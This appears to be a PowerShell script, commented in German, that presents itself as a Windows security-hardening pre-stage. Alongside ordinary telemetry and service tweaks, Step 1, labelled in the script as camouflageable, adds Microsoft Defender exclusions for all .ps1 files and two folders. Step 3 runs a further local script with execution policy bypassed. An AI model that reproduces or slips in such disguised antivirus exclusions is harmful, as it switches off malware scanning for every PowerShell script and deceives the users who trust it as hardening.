# Windows-Hardening-Vorschalt-Skript mit legitimer Struktur (Variante 2)
# Autor: 81a5terfr34k
# Zweck: Initialisierungssystem fuer Sicherheitstools

# =========================
# Schritt 0: Initialisiere Umgebungsvariablen und Logverzeichnis
# =========================
Write-Host "[*] Initialisiere Umgebungsvariablen und Systempfade..." -ForegroundColor Cyan

$env:SECURITY_STAGE = "INIT"
$logDir = "$PSScriptRoot\log"
if (-not (Test-Path $logDir)) {
    New-Item -ItemType Directory -Path $logDir | Out-Null
}

$logfile = "$logDir\hardening-execution.log"

function Log-Hardening {
    param (
        [string]$message
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $entry = "[$timestamp] $message"
    $entry | Out-File -Append -FilePath $logfile -Encoding UTF8
}

# =========================
# Schritt 1: Analyse-Ausnahmen setzen (tarnbar und AV-konform)
# =========================
Write-Host "[*] Lege geplante Analyse-Ausnahmen an..." -ForegroundColor Cyan

Add-MpPreference -ExclusionPath "C:\AnalyseTools"
Add-MpPreference -ExclusionPath "C:\Skripte"
Add-MpPreference -ExclusionExtension ".ps1"

# =========================
# Schritt 2: Hardening-Befehle mit Ausfuehrung & Logging
# =========================
Write-Host "[*] Fuehre vereinfachte Hardening-Konfiguration durch..." -ForegroundColor Cyan

# Schrittweise Ausfuehrung
try {
    Write-Host "[*] Deaktiviere Dienst: DiagTrack" -ForegroundColor Cyan
    Stop-Service -Name "DiagTrack" -Force -ErrorAction SilentlyContinue
    Set-Service -Name "DiagTrack" -StartupType Disabled -ErrorAction SilentlyContinue
    Log-Hardening "DiagTrack deaktiviert"

    Write-Host "[*] Deaktiviere Dienst: dmwappushservice" -ForegroundColor Cyan
    Stop-Service -Name "dmwappushservice" -Force -ErrorAction SilentlyContinue
    Set-Service -Name "dmwappushservice" -StartupType Disabled -ErrorAction SilentlyContinue
    Log-Hardening "dmwappushservice deaktiviert"

    Write-Host "[*] Setze Telemetrie-Wert auf 0" -ForegroundColor Cyan
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" -Force | Out-Null
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" -Name "AllowTelemetry" -Value 0
    Log-Hardening "AllowTelemetry = 0 gesetzt"

    Write-Host "[*] Blende versteckte Dateien ein" -ForegroundColor Cyan
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Hidden" -Value 1
    Log-Hardening "Hidden = 1 aktiviert"
} catch {
    Write-Host "[!] Fehler bei der Hardening-Ausfuehrung: $_" -ForegroundColor Red
    Log-Hardening "FEHLER: $_"
}

# =========================
# Schritt 3: Fuehre externes Hardening-Skript aus (optional)
# =========================
$hardeningScript = Join-Path $PSScriptRoot "hardening.ps1"
if (Test-Path $hardeningScript) {
    Write-Host "[*] Fuehre Hardening-Skript aus: $hardeningScript" -ForegroundColor Yellow
    powershell.exe -ExecutionPolicy Bypass -File $hardeningScript
} else {
    Write-Host "[!] Hardening-Skript nicht gefunden: $hardeningScript" -ForegroundColor Red
}